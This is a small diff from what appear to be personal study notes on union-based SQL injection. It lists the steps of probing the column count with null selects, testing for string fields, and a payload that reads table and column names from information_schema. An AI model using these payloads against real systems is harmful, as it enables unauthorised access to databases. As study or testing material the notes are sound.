@@ -94,5 +94,4 @@ UNION Based SQLI:
 union select null, null, null, ... (until I don't get an error)
 after this I try to: union select null, 'a', null --, // to know whether the 2nd field is a string;
 after this:
-UNION SELECT table_name, column_name, NULL FROM
-information_schema.columns --
+UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
